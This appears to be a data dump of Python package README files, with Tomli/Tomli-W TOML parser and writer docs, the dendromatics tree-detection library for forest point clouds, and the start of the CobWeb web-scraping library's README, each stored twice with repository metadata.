    toml_dict = tomli.load(f)
```

The file must be opened in binary mode (with the `""rb""` flag).
Binary mode will enforce decoding the file as UTF-8 with universal newlines disabled,
both of which are required to correctly parse TOML.

### Handle invalid TOML<a name=""handle-invalid-toml""></a>

```python
import tomli

try:
    toml_dict = tomli.loads(""]] this is invalid TOML [["")
except tomli.TOMLDecodeError:
    print(""Yep, definitely not valid."")
```

Note that error messages are considered informational only.
They should not be assumed to stay constant across Tomli versions.

### Construct `decimal.Decimal`s from TOML floats<a name=""construct-decimaldecimals-from-toml-floats""></a>

```python
from decimal import Decimal
import tomli

toml_dict = tomli.loads(""precision-matters = 0.982492"", parse_float=Decimal)
assert isinstance(toml_dict[""precision-matters""], Decimal)
assert toml_dict[""precision-matters""] == Decimal(""0.982492"")
```

Note that `decimal.Decimal` can be replaced with another callable that converts a TOML float from string to a Python type.
The `decimal.Decimal` is, however, a practical choice for use cases where float inaccuracies can not be tolerated.

Illegal types are `dict` and `list`, and their subtypes.
A `ValueError` will be raised if `parse_float` produces illegal types.

### Building a `tomli`/`tomllib` compatibility layer<a name=""building-a-tomlitomllib-compatibility-layer""></a>

Python versions 3.11+ ship with a version of Tomli:
the `tomllib` standard library module.
To build code that uses the standard library if available,
but still works seamlessly with Python 3.6+,
do the following.

Instead of a hard Tomli dependency, use the following
[dependency specifier](https://packaging.python.org/en/latest/specifications/dependency-specifiers/)
to only require Tomli when the standard library module is not available:

```
tomli >= 1.1.0 ; python_version < ""3.11""
```

Then, in your code, import a TOML parser using the following fallback mechanism:

```python
try:
    import tomllib
except ModuleNotFoundError:
    import tomli as tomllib

tomllib.loads(""['This parses fine with Python 3.6+']"")
```

## FAQ<a name=""faq""></a>

### Why this parser?<a name=""why-this-parser""></a>

- it's lil'
- pure Python with zero dependencies
- the fastest pure Python parser [\*](#performance):
  16x as fast as [tomlkit](https://pypi.org/project/tomlkit/),
  2.3x as fast as [toml](https://pypi.org/project/toml/)
- outputs [basic data types](#how-do-toml-types-map-into-python-types) only
- 100% spec compliant: passes all tests in
  [BurntSushi/toml-test](https://github.com/BurntSushi/toml-test)
  test suite
- thoroughly tested: 100% branch coverage

### Is comment preserving round-trip parsing supported?<a name=""is-comment-preserving-round-trip-parsing-supported""></a>

No.

The `tomli.loads` function returns a plain `dict` that is populated with builtin types and types from the standard library only.
Preserving comments requires a custom type to be returned so will not be supported,
at least not by the `tomli.loads` and `tomli.load` functions.

Look into [TOML Kit](https://github.com/sdispater/tomlkit) if preservation of style is what you need.

### Is there a `dumps`, `write` or `encode` function?<a name=""is-there-a-dumps-write-or-encode-function""></a>

[Tomli-W](https://github.com/hukkin/tomli-w) is the write-only counterpart of Tomli, providing `dump` and `dumps` functions.

The core library does not include write capability, as most TOML use cases are read-only, and Tomli intends to be minimal.

### How do TOML types map into Python types?<a name=""how-do-toml-types-map-into-python-types""></a>

| TOML type        | Python type         | Details                                                      |
| ---------------- | ------------------- | ------------------------------------------------------------ |
| Document Root    | `dict`              |                                                              |
| Key              | `str`               |                                                              |
| String           | `str`               |                                                              |
| Integer          | `int`               |                                                              |
| Float            | `float`             |                                                              |
| Boolean          | `bool`              |                                                              |
| Offset Date-Time | `datetime.datetime` | `tzinfo` attribute set to an instance of `datetime.timezone` |
| Local Date-Time  | `datetime.datetime` | `tzinfo` attribute set to `None`                             |
| Local Date       | `datetime.date`     |                                                              |
| Local Time       | `datetime.time`     |                                                              |
| Array            | `list`              |                                                              |
| Table            | `dict`              |                                                              |
| Inline Table     | `dict`              |                                                              |

## Performance<a name=""performance""></a>

The `benchmark/` folder in this repository contains a performance benchmark for comparing the various Python TOML parsers.
The benchmark can be run with `tox -e benchmark-pypi`.
Running the benchmark on my personal computer output the following:

```console
foo@bar:~/dev/tomli$ tox -e benchmark-pypi
benchmark-pypi installed: attrs==21.4.0,click==8.0.3,pytomlpp==1.0.10,qtoml==0.3.1,rtoml==0.7.1,toml==0.10.2,tomli==2.0.1,tomlkit==0.9.2
benchmark-pypi run-test-pre: PYTHONHASHSEED='3088452573'
benchmark-pypi run-test: commands[0] | python -c 'import datetime; print(datetime.date.today())'
2022-02-09
benchmark-pypi run-test: commands[1] | python --version
Python 3.8.10
benchmark-pypi run-test: commands[2] | python benchmark/run.py
Parsing data.toml 5000 times:
------------------------------------------------------
    parser |  exec time | performance (more is better)
-----------+------------+-----------------------------
     rtoml |    0.891 s | baseline (100%)
  pytomlpp |    0.969 s | 91.90%
     tomli |        4 s | 22.25%
      toml |     9.01 s | 9.88%
     qtoml |     11.1 s | 8.05%
   tomlkit |       63 s | 1.41%
```

The parsers are ordered from fastest to slowest, using the fastest parser as baseline.
Tomli performed the best out of all pure Python TOML parsers,
losing only to pytomlpp (wraps C++) and rtoml (wraps Rust).

# Iron-Tomli-W

A fork of Tomli-W for Iron Python 2

- **Reluctant Iron Python 2 user**: [James Parrott](https://github.com/JamesParrott)
- **Version**: 1.0.0
- **Date**: 25 April, 2023
 - **License**: [MIT](https://github.com/GeospatialPython/pyshp/blob/master/LICENSE.TXT)
 - 
## Installation<a name=""installation""></a>

For the time being, manually copy `_write.py` and `__init__.py` into a folder called `iron-tomli-w` into a path (and append that to sys.path if it's not already there)

# Parent Project number (2/2)'s Readme File (Iron-Tomli-W)

A fork of Tomli-W for Iron Python 2

- **Reluctant Iron Python 2 user**: [James Parrott](https://github.com/JamesParrott)
- **Version**: 1.0.0
- **Date**: 25 April, 2023
 - **License**: [MIT](https://github.com/GeospatialPython/pyshp/blob/master/LICENSE.TXT)
 - 
## Installation<a name=""installation""></a>

For the time being, manually copy `_write.py` and `__init__.py` into a folder called `iron-tomli-w` into a path (and append that to sys.path if it's not already there)

# Tomli-W

> A lil' TOML writer

**Table of Contents**  *generated with [mdformat-toc](https://github.com/hukkin/mdformat-toc)*

<!-- mdformat-toc start --slug=github --maxlevel=6 --minlevel=2 -->

- [Intro](#intro)
- [Installation](#installation)
- [Usage](#usage)
  - [Write to string](#write-to-string)
  - [Write to file](#write-to-file)
- [FAQ](#faq)
  - [Does Tomli-W sort the document?](#does-tomli-w-sort-the-document)
  - [Does Tomli-W support writing documents with comments or custom whitespace?](#does-tomli-w-support-writing-documents-with-comments-or-custom-whitespace)
  - [Why does Tomli-W not write a multi-line string if the string value contains newlines?](#why-does-tomli-w-not-write-a-multi-line-string-if-the-string-value-contains-newlines)
  - [Is Tomli-W output guaranteed to be valid TOML?](#is-tomli-w-output-guaranteed-to-be-valid-toml)

<!-- mdformat-toc end -->

## Intro<a name=""intro""></a>

Tomli-W is a Python library for writing [TOML](https://toml.io).
It is a write-only counterpart to [Tomli](https://github.com/hukkin/tomli),
which is a read-only TOML parser.
Tomli-W is fully compatible with [TOML v1.0.0](https://toml.io/en/v1.0.0).

## Usage<a name=""usage""></a>

### Write to string<a name=""write-to-string""></a>

```python
import tomli_w

doc = {""table"": {""nested"": {}, ""val3"": 3}, ""val2"": 2, ""val1"": 1}
expected_toml = """"""\
val2 = 2
val1 = 1

[table]
val3 = 3

[table.nested]
""""""
assert tomli_w.dumps(doc) == expected_toml
```

### Write to file<a name=""write-to-file""></a>

```python
import tomli_w

doc = {""one"": 1, ""two"": 2, ""pi"": 3}
with open(""path_to_file/conf.toml"", ""wb"") as f:
    tomli_w.dump(doc, f)
```

## FAQ<a name=""faq""></a>

### Does Tomli-W sort the document?<a name=""does-tomli-w-sort-the-document""></a>

No, but it respects sort order of the input data,
so one could sort the content of the `dict` (recursively) before calling `tomli_w.dumps`.

### Does Tomli-W support writing documents with comments or custom whitespace?<a name=""does-tomli-w-support-writing-documents-with-comments-or-custom-whitespace""></a>

No.

### Why does Tomli-W not write a multi-line string if the string value contains newlines?<a name=""why-does-tomli-w-not-write-a-multi-line-string-if-the-string-value-contains-newlines""></a>

This default was chosen to achieve lossless parse/write round-trips.

TOML strings can contain newlines where exact bytes matter, e.g.

```toml
s = ""here's a newline\r\n""
```

TOML strings also can contain newlines where exact byte representation is not relevant, e.g.

```toml
s = """"""here's a newline
""""""
```

A parse/write round-trip that converts the former example to the latter does not preserve the original newline byte sequence.
This is why Tomli-W avoids writing multi-line strings.

A keyword argument is provided for users who do not need newline bytes to be preserved:

```python
import tomli_w

doc = {""s"": ""here's a newline\r\n""}
expected_toml = '''\
s = """"""
here's a newline
""""""
'''
assert tomli_w.dumps(doc, multiline_strings=True) == expected_toml
```

### Is Tomli-W output guaranteed to be valid TOML?<a name=""is-tomli-w-output-guaranteed-to-be-valid-toml""></a>

No.
If there's a chance that your input data is bad and you need output validation,
parse the output string once with `tomli.loads`.
If the parse is successful (does not raise `tomli.TOMLDecodeError`) then the string is valid TOML.

","# toml_tools, Tomli and Tomli-W for Python 2 and Iron Python

v1.0.0 is a complete overhaul.  toml_tools is now based on tomli and tomli-w.

# Parent Project number (1/2)'s Readme File (Tomli)

> A lil' TOML parser

**Table of Contents**  *generated with [mdformat-toc](https://github.com/hukkin/mdformat-toc)*



- [Intro](#intro)
- [Installation](#installation)
- [Usage](#usage)
  - [Parse a TOML string](#parse-a-toml-string)
  - [Parse a TOML file](#parse-a-toml-file)
  - [Handle invalid TOML](#handle-invalid-toml)
  - [Construct `decimal.Decimal`s from TOML floats](#construct-decimaldecimals-from-toml-floats)
  - [Building a `tomli`/`tomllib` compatibility layer](#building-a-tomlitomllib-compatibility-layer)
- [FAQ](#faq)
  - [Why this parser?](#why-this-parser)
  - [Is comment preserving round-trip parsing supported?](#is-comment-preserving-round-trip-parsing-supported)
  - [Is there a `dumps`, `write` or `encode` function?](#is-there-a-dumps-write-or-encode-function)
  - [How do TOML types map into Python types?](#how-do-toml-types-map-into-python-types)
- [Performance](#performance)



## Intro

Tomli is a Python library for parsing [TOML](https://toml.io).
It is fully compatible with [TOML v1.0.0](https://toml.io/en/v1.0.0).

A version of Tomli, the `tomllib` module,
was added to the standard library in Python 3.11
via [PEP 680](https://www.python.org/dev/peps/pep-0680/).
Tomli continues to provide a backport on PyPI for Python versions
where the standard library module is not available
and that have not yet reached their end-of-life.

## Installation

```bash
pip install tomli
```

## Usage

### Parse a TOML string

```python
import tomli

toml_str = """"""
[[players]]
name = ""Lehtinen""
number = 26

[[players]]
name = ""Numminen""
number = 27
""""""

toml_dict = tomli.loads(toml_str)
assert toml_dict == {
    ""players"": [{""name"": ""Lehtinen"", ""number"": 26}, {""name"": ""Numminen"", ""number"": 27}]
}
```

### Parse a TOML file

```python
import tomli

with open(""path_to_file/conf.toml"", ""rb"") as f:
    toml_dict = tomli.load(f)
```

The file must be opened in binary mode (with the `""rb""` flag).
Binary mode will enforce decoding the file as UTF-8 with universal newlines disabled,
both of which are required to correctly parse TOML.

### Handle invalid TOML

```python
import tomli

try:
    toml_dict = tomli.loads(""]] this is invalid TOML [["")
except tomli.TOMLDecodeError:
    print(""Yep, definitely not valid."")
```

Note that error messages are considered informational only.
They should not be assumed to stay constant across Tomli versions.

### Construct `decimal.Decimal`s from TOML floats

```python
from decimal import Decimal
import tomli

toml_dict = tomli.loads(""precision-matters = 0.982492"", parse_float=Decimal)
assert isinstance(toml_dict[""precision-matters""], Decimal)
assert toml_dict[""precision-matters""] == Decimal(""0.982492"")
```

Note that `decimal.Decimal` can be replaced with another callable that converts a TOML float from string to a Python type.
The `decimal.Decimal` is, however, a practical choice for use cases where float inaccuracies can not be tolerated.

Illegal types are `dict` and `list`, and their subtypes.
A `ValueError` will be raised if `parse_float` produces illegal types.

### Building a `tomli`/`tomllib` compatibility layer

Python versions 3.11+ ship with a version of Tomli:
the `tomllib` standard library module.
To build code that uses the standard library if available,
but still works seamlessly with Python 3.6+,
do the following.

Instead of a hard Tomli dependency, use the following
[dependency specifier](https://packaging.python.org/en/latest/specifications/dependency-specifiers/)
to only require Tomli when the standard library module is not available:

```
tomli >= 1.1.0 ; python_version < ""3.11""
```

Then, in your code, import a TOML parser using the following fallback mechanism:

```python
try:
    import tomllib
except ModuleNotFoundError:
    import tomli as tomllib

tomllib.loads(""['This parses fine with Python 3.6+']"")
```

## FAQ

### Why this parser?

- it's lil'
- pure Python with zero dependencies
- the fastest pure Python parser [\*](#performance):
  16x as fast as [tomlkit](https://pypi.org/project/tomlkit/),
  2.3x as fast as [toml](https://pypi.org/project/toml/)
- outputs [basic data types](#how-do-toml-types-map-into-python-types) only
- 100% spec compliant: passes all tests in
  [BurntSushi/toml-test](https://github.com/BurntSushi/toml-test)
  test suite
- thoroughly tested: 100% branch coverage

### Is comment preserving round-trip parsing supported?

No.

The `tomli.loads` function returns a plain `dict` that is populated with builtin types and types from the standard library only.
Preserving comments requires a custom type to be returned so will not be supported,
at least not by the `tomli.loads` and `tomli.load` functions.

Look into [TOML Kit](https://github.com/sdispater/tomlkit) if preservation of style is what you need.

### Is there a `dumps`, `write` or `encode` function?

[Tomli-W](https://github.com/hukkin/tomli-w) is the write-only counterpart of Tomli, providing `dump` and `dumps` functions.

The core library does not include write capability, as most TOML use cases are read-only, and Tomli intends to be minimal.

### How do TOML types map into Python types?

| TOML type        | Python type         | Details                                                      |
| ---------------- | ------------------- | ------------------------------------------------------------ |
| Document Root    | `dict`              |                                                              |
| Key              | `str`               |                                                              |
| String           | `str`               |                                                              |
| Integer          | `int`               |                                                              |
| Float            | `float`             |                                                              |
| Boolean          | `bool`              |                                                              |
| Offset Date-Time | `datetime.datetime` | `tzinfo` attribute set to an instance of `datetime.timezone` |
| Local Date-Time  | `datetime.datetime` | `tzinfo` attribute set to `None`                             |
| Local Date       | `datetime.date`     |                                                              |
| Local Time       | `datetime.time`     |                                                              |
| Array            | `list`              |                                                              |
| Table            | `dict`              |                                                              |
| Inline Table     | `dict`              |                                                              |

## Performance

The `benchmark/` folder in this repository contains a performance benchmark for comparing the various Python TOML parsers.
The benchmark can be run with `tox -e benchmark-pypi`.
Running the benchmark on my personal computer output the following:

```console
foo@bar:~/dev/tomli$ tox -e benchmark-pypi
benchmark-pypi installed: attrs==21.4.0,click==8.0.3,pytomlpp==1.0.10,qtoml==0.3.1,rtoml==0.7.1,toml==0.10.2,tomli==2.0.1,tomlkit==0.9.2
benchmark-pypi run-test-pre: PYTHONHASHSEED='3088452573'
benchmark-pypi run-test: commands[0] | python -c 'import datetime; print(datetime.date.today())'
2022-02-09
benchmark-pypi run-test: commands[1] | python --version
Python 3.8.10
benchmark-pypi run-test: commands[2] | python benchmark/run.py
Parsing data.toml 5000 times:
------------------------------------------------------
    parser |  exec time | performance (more is better)
-----------+------------+-----------------------------
     rtoml |    0.891 s | baseline (100%)
  pytomlpp |    0.969 s | 91.90%
     tomli |        4 s | 22.25%
      toml |     9.01 s | 9.88%
     qtoml |     11.1 s | 8.05%
   tomlkit |       63 s | 1.41%
```

The parsers are ordered from fastest to slowest, using the fastest parser as baseline.
Tomli performed the best out of all pure Python TOML parsers,
losing only to pytomlpp (wraps C++) and rtoml (wraps Rust).

# Iron-Tomli-W

A fork of Tomli-W for Iron Python 2

- **Reluctant Iron Python 2 user**: [James Parrott](https://github.com/JamesParrott)
- **Version**: 1.0.0
- **Date**: 25 April, 2023
 - **License**: [MIT](https://github.com/GeospatialPython/pyshp/blob/master/LICENSE.TXT)
 - 
## Installation

For the time being, manually copy `_write.py` and `__init__.py` into a folder called `iron-tomli-w` into a path (and append that to sys.path if it's not already there)

# Parent Project number (2/2)'s Readme File (Iron-Tomli-W)

A fork of Tomli-W for Iron Python 2

- **Reluctant Iron Python 2 user**: [James Parrott](https://github.com/JamesParrott)
- **Version**: 1.0.0
- **Date**: 25 April, 2023
 - **License**: [MIT](https://github.com/GeospatialPython/pyshp/blob/master/LICENSE.TXT)
 - 
## Installation

For the time being, manually copy `_write.py` and `__init__.py` into a folder called `iron-tomli-w` into a path (and append that to sys.path if it's not already there)

# Tomli-W

> A lil' TOML writer

**Table of Contents**  *generated with [mdformat-toc](https://github.com/hukkin/mdformat-toc)*



- [Intro](#intro)
- [Installation](#installation)
- [Usage](#usage)
  - [Write to string](#write-to-string)
  - [Write to file](#write-to-file)
- [FAQ](#faq)
  - [Does Tomli-W sort the document?](#does-tomli-w-sort-the-document)
  - [Does Tomli-W support writing documents with comments or custom whitespace?](#does-tomli-w-support-writing-documents-with-comments-or-custom-whitespace)
  - [Why does Tomli-W not write a multi-line string if the string value contains newlines?](#why-does-tomli-w-not-write-a-multi-line-string-if-the-string-value-contains-newlines)
  - [Is Tomli-W output guaranteed to be valid TOML?](#is-tomli-w-output-guaranteed-to-be-valid-toml)



## Intro

Tomli-W is a Python library for writing [TOML](https://toml.io).
It is a write-only counterpart to [Tomli](https://github.com/hukkin/tomli),
which is a read-only TOML parser.
Tomli-W is fully compatible with [TOML v1.0.0](https://toml.io/en/v1.0.0).

## Usage

### Write to string

```python
import tomli_w

doc = {""table"": {""nested"": {}, ""val3"": 3}, ""val2"": 2, ""val1"": 1}
expected_toml = """"""\
val2 = 2
val1 = 1

[table]
val3 = 3

[table.nested]
""""""
assert tomli_w.dumps(doc) == expected_toml
```

### Write to file

```python
import tomli_w

doc = {""one"": 1, ""two"": 2, ""pi"": 3}
with open(""path_to_file/conf.toml"", ""wb"") as f:
    tomli_w.dump(doc, f)
```

## FAQ

### Does Tomli-W sort the document?

No, but it respects sort order of the input data,
so one could sort the content of the `dict` (recursively) before calling `tomli_w.dumps`.

### Does Tomli-W support writing documents with comments or custom whitespace?

No.

### Why does Tomli-W not write a multi-line string if the string value contains newlines?

This default was chosen to achieve lossless parse/write round-trips.

TOML strings can contain newlines where exact bytes matter, e.g.

```toml
s = ""here's a newline\r\n""
```

TOML strings also can contain newlines where exact byte representation is not relevant, e.g.

```toml
s = """"""here's a newline
""""""
```

A parse/write round-trip that converts the former example to the latter does not preserve the original newline byte sequence.
This is why Tomli-W avoids writing multi-line strings.

A keyword argument is provided for users who do not need newline bytes to be preserved:

```python
import tomli_w

doc = {""s"": ""here's a newline\r\n""}
expected_toml = '''\
s = """"""
here's a newline
""""""
'''
assert tomli_w.dumps(doc, multiline_strings=True) == expected_toml
```

### Is Tomli-W output guaranteed to be valid TOML?

No.
If there's a chance that your input data is bad and you need output validation,
parse the output string once with `tomli.loads`.
If the parse is successful (does not raise `tomli.TOMLDecodeError`) then the string is valid TOML.

",jamesparrott/toml_tools
dendromatics,https://github.com/3DFIN/dendromatics,6,5739,5654,"Description
===========

The `src` folder contains functionalities to detect the trees present in a terrestrial 3D point cloud from a forest plot, and compute individual tree parameters: tree height, tree location, diameters along the stem (including DBH), and stem axis. These are based on an updated version of the algorithm proposed by (Cabo et al., 2018).

The functionalities may be divided in four main steps:

0. Height-normalization of the point cloud (pre-requisite). 
1. Identification of stems among user-provided stripe.
2. Tree individualization based on point-to-stems distances.
3. Robust computation of stems diameter at different section heights.

Although individual, somewhat independent functions are provided, they are designed to be used in a script that calls one after the other following the algorithm structure. An example script can be found in `example` folder.


Examples
========


Height-normalization
--------------------

Almost all functions in the module expect a height-normalized point cloud to work as intended. If your point cloud is not height-normalized, you can do it in a simple way using some of the module functions.

.. code-block:: python
    
    import laspy
    import numpy as np
    import dendromatics as dm

    # Reading the point cloud
    filename_las = 'example_data.las' # your .las file
    entr = laspy.read(filename_las)
    coords = np.vstack((entr.x, entr.y, entr.z)).transpose()
    
    # Normalizing the point cloud
    dtm = dm.generate_dtm(clean_points)
    z0_values = dm.normalize_heights(coords, dtm)

    # adding the normalized heights to the point cloud
    coords = np.append(coords, np.expand_dims(z0_values, axis = 1), 1) 

If the point cloud is noisy, you might want to denoise it first before generating the DTM.

.. code-block:: python

    clean_points = dm.clean_ground(coords)


Identifying stems from a stripe
-------------------------------

Simply provide a stripe (from a height-normalized point cloud) as follows to iteratively 'peel off' the stems.

.. code-block:: python

    # Defining the stripe
    lower_limit = 0.5
    upper_limit = 2.5
    stripe = coords[(coords[:, 3] > lower_limit) & (coords[:, 3] < upper_limit), 0:4]

    stripe_stems = dm.verticality_clustering(stripe, n_iter = 2)  


Individualizing trees
---------------------

Once the stems have been identified in the stripe, they can be used to individualize the trees in the point cloud.

.. code-block:: python
   
    assigned_cloud, tree_vector, tree_heights = dm.individualize_trees(coords, stripe_stems)     


Computing sections along the stems
----------------------------------

compute_sections() can be used to compute sections along the stems of the individualized trees.

.. code-block:: python

    # Preprocessing: reducing the point cloud size by keeping only the points that are closer than some radius (expected_R) to the tree axes 
    # and those that are whithin the lowest section (min_h) and the uppest section (max_h) to be computed.
    expected_R = 0.5
    min_h = 0.5 
    max_h = 25
    section_width = 0.02
    xyz0_coords = assigned_cloud[(assigned_cloud[:, 5] < expected_R) & (assigned_cloud[:, 3] > min_h) & (assigned_cloud[:,3] < max_h + section_width), :]
    
    stems = dm.verticality_clustering(xyz0_coords, n_iter = 2)[:, 0:6]
    
    # Computing the sections
    section_len = 0.2
    sections = np.arange(min_h, max_h, section_len) # Range of uniformly spaced values within the specified interval 
    X_c, Y_c, R, check_circle, second_time, sector_perct, n_points_in = dm.compute_sections(stems, sections)


Tilt detection 
--------------

tilt_detection() computes an 'outlier probability' for each section based on its tilting relative to neighbour sections and relative to the tree axis.

.. code-block:: python
    
    outlier_prob = dm.tilt_detection(X_c, Y_c, R, sections)


For further examples and more thorough explanations, please check *example.py* script in */examples* folder.


References
==========

Cabo, C., Ordóñez, C., López-Sánchez, C. A., & Armesto, J. (2018). Automatic dendrometry: Tree detection, tree height and diameter estimation using terrestrial laser scanning. International Journal of Applied Earth Observation and Geoinformation, 69, 164–174. https://doi.org/10.1016/j.jag.2018.01.011


Ester, M., Kriegel, H.-P., Sander, J., & Xu, X. (1996). A Density-Based Algorithm for Discovering Clusters in Large Spatial Databases with Noise. www.aaai.org


Prendes, C., Cabo, C., Ordoñez, C., Majada, J., & Canga, E. (2021). An algorithm for the automatic parametrization of wood volume equations from Terrestrial Laser Scanning point clouds: application in Pinus pinaster. GIScience and Remote Sensing, 58(7), 1130–1150. https://doi.org/10.1080/15481603.2021.1972712 


Install
=======

*dendromatics* is available on `PyPI <TODO PyPi link>`_ and the full documentation can be consulted on `TBD <TODO doc link>`_

The list of dependencies is available in the *pyproject.toml* file.

*dendromatics* relies on `hatch <https://github.com/pypa/hatch>`_

Depending on your version of Python and your OS, you might also need a C/C++ compiler to compile some of the mandatory dependencies (CSF and jakteristics). 
But in any case you would not have to run the compiler by yourself, the build system will manage dependencies and compilation for you. 

.. code-block:: console
    
    python -m pip install hatch

You can run tests to ensure it works on your computer.

.. code-block:: console
    
    hatch run cov

It is also possible to build doc locally.

.. code-block:: console
   
    hatch run docs:build
    hatch run docs:serve

and then go to `http://localhost:8000 <http://localhost:8000>`_ to browse it.
","Description
===========

The `src` folder contains functionalities to detect the trees present in a terrestrial 3D point cloud from a forest plot, and compute individual tree parameters: tree height, tree location, diameters along the stem (including DBH), and stem axis. These are based on an updated version of the algorithm proposed by (Cabo et al., 2018).

The functionalities may be divided in four main steps:

0. Height-normalization of the point cloud (pre-requisite). 
1. Identification of stems among user-provided stripe.
2. Tree individualization based on point-to-stems distances.
3. Robust computation of stems diameter at different section heights.

Although individual, somewhat independent functions are provided, they are designed to be used in a script that calls one after the other following the algorithm structure. An example script can be found in `example` folder.


Examples
========


Height-normalization
--------------------

Almost all functions in the module expect a height-normalized point cloud to work as intended. If your point cloud is not height-normalized, you can do it in a simple way using some of the module functions.

.. code-block:: python
    
    import laspy
    import numpy as np
    import dendromatics as dm

    # Reading the point cloud
    filename_las = 'example_data.las' # your .las file
    entr = laspy.read(filename_las)
    coords = np.vstack((entr.x, entr.y, entr.z)).transpose()
    
    # Normalizing the point cloud
    dtm = dm.generate_dtm(clean_points)
    z0_values = dm.normalize_heights(coords, dtm)

    # adding the normalized heights to the point cloud
    coords = np.append(coords, np.expand_dims(z0_values, axis = 1), 1) 

If the point cloud is noisy, you might want to denoise it first before generating the DTM.

.. code-block:: python

    clean_points = dm.clean_ground(coords)


Identifying stems from a stripe
-------------------------------

Simply provide a stripe (from a height-normalized point cloud) as follows to iteratively 'peel off' the stems.

.. code-block:: python

    # Defining the stripe
    lower_limit = 0.5
    upper_limit = 2.5
    stripe = coords[(coords[:, 3] > lower_limit) & (coords[:, 3] < upper_limit), 0:4]

    stripe_stems = dm.verticality_clustering(stripe, n_iter = 2)  


Individualizing trees
---------------------

Once the stems have been identified in the stripe, they can be used to individualize the trees in the point cloud.

.. code-block:: python
   
    assigned_cloud, tree_vector, tree_heights = dm.individualize_trees(coords, stripe_stems)     


Computing sections along the stems
----------------------------------

compute_sections() can be used to compute sections along the stems of the individualized trees.

.. code-block:: python

    # Preprocessing: reducing the point cloud size by keeping only the points that are closer than some radius (expected_R) to the tree axes 
    # and those that are whithin the lowest section (min_h) and the uppest section (max_h) to be computed.
    expected_R = 0.5
    min_h = 0.5 
    max_h = 25
    section_width = 0.02
    xyz0_coords = assigned_cloud[(assigned_cloud[:, 5] < expected_R) & (assigned_cloud[:, 3] > min_h) & (assigned_cloud[:,3] < max_h + section_width), :]
    
    stems = dm.verticality_clustering(xyz0_coords, n_iter = 2)[:, 0:6]
    
    # Computing the sections
    section_len = 0.2
    sections = np.arange(min_h, max_h, section_len) # Range of uniformly spaced values within the specified interval 
    X_c, Y_c, R, check_circle, second_time, sector_perct, n_points_in = dm.compute_sections(stems, sections)


Tilt detection 
--------------

tilt_detection() computes an 'outlier probability' for each section based on its tilting relative to neighbour sections and relative to the tree axis.

.. code-block:: python
    
    outlier_prob = dm.tilt_detection(X_c, Y_c, R, sections)


For further examples and more thorough explanations, please check *example.py* script in */examples* folder.


References
==========

Cabo, C., Ordóñez, C., López-Sánchez, C. A., & Armesto, J. (2018). Automatic dendrometry: Tree detection, tree height and diameter estimation using terrestrial laser scanning. International Journal of Applied Earth Observation and Geoinformation, 69, 164–174. https://doi.org/10.1016/j.jag.2018.01.011


Ester, M., Kriegel, H.-P., Sander, J., & Xu, X. (1996). A Density-Based Algorithm for Discovering Clusters in Large Spatial Databases with Noise. www.aaai.org


Prendes, C., Cabo, C., Ordoñez, C., Majada, J., & Canga, E. (2021). An algorithm for the automatic parametrization of wood volume equations from Terrestrial Laser Scanning point clouds: application in Pinus pinaster. GIScience and Remote Sensing, 58(7), 1130–1150. https://doi.org/10.1080/15481603.2021.1972712 


Install
=======

*dendromatics* is available on `PyPI `_ and the full documentation can be consulted on `TBD `_

The list of dependencies is available in the *pyproject.toml* file.

*dendromatics* relies on `hatch `_

Depending on your version of Python and your OS, you might also need a C/C++ compiler to compile some of the mandatory dependencies (CSF and jakteristics). 
But in any case you would not have to run the compiler by yourself, the build system will manage dependencies and compilation for you. 

.. code-block:: console
    
    python -m pip install hatch

You can run tests to ensure it works on your computer.

.. code-block:: console
    
    hatch run cov

It is also possible to build doc locally.

.. code-block:: console
   
    hatch run docs:build
    hatch run docs:serve

and then go to `http://localhost:8000 `_ to browse it.
",3dfin/dendromatics
cobweb-lnx,https://github.com/GoncaloMark/Amara-CobWeb,21,3194,3194,"# CobWeb

CobWeb is a Python library for web scraping. The library consists of two classes: Spider and Scraper.

## Spider

The Spider class is used to crawl a website and identify internal and external links. It has the following methods:

    __init__(self, url, max_hops = 0): Initializes a Spider object with the given URL and maximum number of links to follow from the initial URL.
    getLinks(self): Crawls the website and identifies internal and external links.
    showLinks(self): Returns the set of internal and external URLs found during crawling.
    __str__(self): Returns a string representation of the Spider object.
    __repr__(self): Returns a string representation of the Spider object.

## Scraper

The Scraper class extends the functionality of the Spider class by scraping HTML content from web pages based on user-defined parameters. It has the following methods:

    __init__(self, config): Initializes a Scraper object with the given configuration parameters.
    run(self): A public method to scrape HTML content from web pages based on user-defined parameters.
    __str__(self): Returns a string representation of the Scraper object.
    __repr__(self): Returns a string representation of the Scraper object.

## Installation

You can install CobWeb using pip:

```bash

        pip install CobWeb

```

## Config

Config is either an object in memory or a YAML file you can build by installing YAMLbuilder or by using the provided template!
Example of a complete object:

 ```python 

        config = {
                    ""url"": 
                    ""hops"": 
                    ""tags"":
                    ""classes"":
                    ""attrs"":
                    ""attrV"":
                    ""IDv"":
                    ""selectors"":
                }
```

Example of YAML file (If you choose this path call the config_parser function and give it a valid path!):

```yaml
        IDv:
        attrV: []
        attrs: []
        classes: []
        hops: 
        selectors: []
        tags:
        - 
        - 
        url: 
```

## Example Usage

```python

        from CobWeb import Spider, Scraper

        # Create a Spider object with a URL and maximum number of hops
        spider = Spider(""https://example.com"", max_hops=10)

        # Get the internal and external links
        internal_links, external_links = spider.showLinks()

        # Create a Scraper object with a configuration dictionary
        # hops defines how deep it will scrape, it uses the Spider internally to get more links and scrape from those pages! If you just want to scrape from a single page set it to 0 or don't provide hops
        config = {
            ""url"": ""https://example.com"",
            ""hops"": 2,
            ""tags"": [""h1"", ""p""]
        }
        scraper = Scraper(config)

        # Scrape HTML content from web pages based on user-defined parameters
        results = scraper.run()

        # Print the results it shall be a dictionary with arrays of scraped content separated by element, attributes, etc provided in the config!
        print(results)


```
","# CobWeb

CobWeb is a Python library for web scraping. The library consists of two classes: Spider and Scraper.

## Spider

The Spider class is used to crawl a website and identify internal and external links. It has the following methods:

    __init__(self, url, max_hops = 0): Initializes a Spider object with the given URL and maximum number of links to follow from the initial URL.
    getLinks(self): Crawls the website and identifies internal and external links.
    showLinks(self): Returns the set of internal and external URLs found during crawling.
    __str__(self): Returns a string representation of the Spider object.
    __repr__(self): Returns a string representation of the Spider object.

## Scraper

The Scraper class extends the functionality of the Spider class by scraping HTML content from web pages based on user-defined parameters. It has the following methods:

    __init__(self, config): Initializes a Scraper object with the given configuration parameters.
    run(self): A public method to scrape HTML content from web pages based on user-defined parameters.
    __str__(self): Returns a string representation of the Scraper object.
    __repr__(self): Returns a string representation of the Scraper object.

## Installation

You can install CobWeb using pip:

```bash

        pip install CobWeb

```

## Config

Config is either an object in memory or a YAML file you can build by installing YAMLbuilder or by using the provided template!
Example of a complete object:

 ```python 

        config = {
